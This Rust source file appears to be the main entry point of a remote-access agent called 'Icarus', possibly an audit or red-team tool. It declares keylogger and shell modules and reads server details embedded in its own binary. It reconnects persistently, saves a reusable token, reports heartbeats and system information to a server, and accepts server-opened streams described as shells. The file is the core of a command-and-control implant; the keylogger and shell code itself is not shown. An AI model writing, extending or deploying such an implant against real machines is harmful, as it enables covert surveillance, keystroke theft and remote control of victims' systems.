mod keylogger;
mod network;
mod shell;
mod sysinfo;

use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use network::{Client, MultiplexManager};
use shared::packets::{Heartbeat, Packet};

const CONFIG_MARKER: &[u8] = b"\n###ICARUS_CONFIG###\n";
const SAVED_TOKEN_FILE: &str = ".icarus-agent";

struct EmbeddedConfig {
    audit_id: String,
    token: String,
    server_addr: String,
}

struct SavedAgent {
    agent_token: String,
}

fn read_embedded_config() -> Option<EmbeddedConfig> {
    let exe_path = std::env::current_exe().ok()?;
    let data = std::fs::read(&exe_path).ok()?;

    let marker_pos = data
        .windows(CONFIG_MARKER.len())
        .rposition(|w| w == CONFIG_MARKER)?;

    let json_start = marker_pos + CONFIG_MARKER.len();
    let json_bytes = &data[json_start..];
    let json_str = std::str::from_utf8(json_bytes).ok()?;

    let parsed: serde_json::Value = serde_json::from_str(json_str).ok()?;
    Some(EmbeddedConfig {
        audit_id: parsed.get("audit_id")?.as_str()?.to_string(),
        token: parsed.get("token")?.as_str()?.to_string(),
        server_addr: parsed.get("server_addr")?.as_str()?.to_string(),
    })
}

fn saved_token_path() -> std::path::PathBuf {
    std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|d| d.join(SAVED_TOKEN_FILE)))
        .unwrap_or_else(|| std::path::PathBuf::from(SAVED_TOKEN_FILE))
}

fn read_saved_agent() -> Option<SavedAgent> {
    let path = saved_token_path();
    let data = std::fs::read_to_string(&path).ok()?;
    let parsed: serde_json::Value = serde_json::from_str(&data).ok()?;
    Some(SavedAgent {
        agent_token: parsed.get("agent_token")?.as_str()?.to_string(),
    })
}

fn save_agent_token(agent_token: &str) {
    let path = saved_token_path();
    let json = serde_json::json!({ "agent_token": agent_token });
    if let Err(e) = std::fs::write(&path, json.to_string()) {
        eprintln!("Failed to save agent token: {e}");
    }
}

fn get_hostname() -> String {
    #[cfg(target_os = "windows")]
    {
        std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".to_string())
    }
    #[cfg(not(target_os = "windows"))]
    {
        std::fs::read_to_string("/etc/hostname")
            .map_or_else(|_| "unknown".to_string(), |s| s.trim().to_string())
    }
}

#[allow(clippy::too_many_lines)]
fn main() {
    let (audit_id, deploy_token, server_addr) = if let Some(config) = read_embedded_config() {
        println!("Using embedded configuration");
        (config.audit_id, config.token, config.server_addr)
    } else {
        println!("No embedded config found, falling back to environment variables");
        let audit_id = std::env::var("AGENT_AUDIT_ID").expect("AGENT_AUDIT_ID must be set");
        let agent_token = std::env::var("AGENT_TOKEN").expect("AGENT_TOKEN must be set");
        let server_addr =
            std::env::var("AGENT_SERVER_ADDR").expect("AGENT_SERVER_ADDR must be set");
        (audit_id, agent_token, server_addr)
    };

    // Use saved agent token if available, otherwise use deployment token
    let token = if let Some(saved) = read_saved_agent() {
        println!("Using saved agent token");
        saved.agent_token
    } else {
        println!("No saved token, using deployment token");
        deploy_token
    };

    let hostname = get_hostname();
    println!("Hostname: {hostname}");

    let mut client = loop {
        if let Ok(client) = Client::new(&server_addr) {
            break client;
        }
        eprintln!("Failed to connect to server, retrying in 5 seconds..");
        std::thread::sleep(Duration::from_secs(5));
    };
    println!("Connected to server successfully!");

    // Authenticate with audit credentials + hostname
    match client.authenticate(&audit_id, &token, &hostname) {
        Ok((agent_token, agent_id)) => {
            println!("Authentication successful for audit {audit_id} (agent: {agent_id})");
            // If server assigned a new agent token, save it for future reconnections
            if !agent_token.is_empty() {
                println!("Saving assigned agent token");
                save_agent_token(&agent_token);
            }
        }
        Err(e) => {
            eprintln!("Authentication failed: {e}");
            return;
        }
    }

    let manager = Arc::new(MultiplexManager::new(client));
    let shutdown_flag = manager.shutdown_flag();

    let _receive_thread = manager.start();

    println!("Multiplex manager started, waiting for streams from server...");

    // Shared latency value updated when heartbeat echo is received
    let last_latency_ms: Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
    manager.set_latency_tracker(last_latency_ms.clone());

    // Heartbeat thread: send every 10 seconds with timing info
    let hb_manager = manager.clone();
    let hb_shutdown = shutdown_flag.clone();
    let hb_latency = last_latency_ms.clone();
    std::thread::spawn(move || {
        loop {
            std::thread::sleep(Duration::from_secs(10));
            if hb_shutdown.load(Ordering::Relaxed) {
                break;
            }
            #[allow(clippy::cast_possible_truncation)]
            let now_ms = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_millis() as u64;
            let latency = hb_latency.load(Ordering::Relaxed);
            let hb = Heartbeat::with_timing(now_ms, latency);
            match hb.serialize() {
                Ok(buf) => {
                    if let Err(e) = hb_manager.send_control_packet(&buf) {
                        eprintln!("Failed to send heartbeat: {e}");
                        break;
                    }
                }
                Err(e) => eprintln!("Failed to serialize heartbeat: {e}"),
            }
        }
    });

    // System info thread: send immediately, then every 60 seconds
    let si_manager = manager.clone();
    let si_shutdown = shutdown_flag.clone();
    std::thread::spawn(move || {
        let send_info = |mgr: &Arc<MultiplexManager>| {
            let info = sysinfo::collect_system_info();
            match info.serialize() {
                Ok(buf) => {
                    if let Err(e) = mgr.send_control_packet(&buf) {
                        eprintln!("Failed to send system info: {e}");
                        return false;
                    }
                    println!("System info sent to server");
                }
                Err(e) => eprintln!("Failed to serialize system info: {e}"),
            }
            true
        };

        if !send_info(&si_manager) {
            return;
        }
        loop {
            std::thread::sleep(Duration::from_secs(60));
            if si_shutdown.load(Ordering::Relaxed) {
                break;
            }
            if !send_info(&si_manager) {
                break;
            }
        }
    });

    loop {
        if shutdown_flag.load(Ordering::Relaxed) {
            println!("Shutdown signal received, exiting...");
            break;
        }

        match manager.accept_stream() {
            Ok(stream) => {
                println!("Stream opened by server: stream_id={}", stream.id());
                // Shell streams are handled internally by handle_shell_request.
                // Drain any unexpected streams to avoid blocking the channel.
                std::thread::spawn(move || {
                    while let Ok(data) = stream.receive() {
                        if data.is_empty() {
                            break;
                        }
                    }
                });
            }
            Err(e) => {
                if shutdown_flag.load(Ordering::Relaxed) {
                    println!("Shutdown signal received, exiting...");
                } else {
                    eprintln!("Failed to accept stream: {e}");
                }
                break;
            }
        }
    }
}
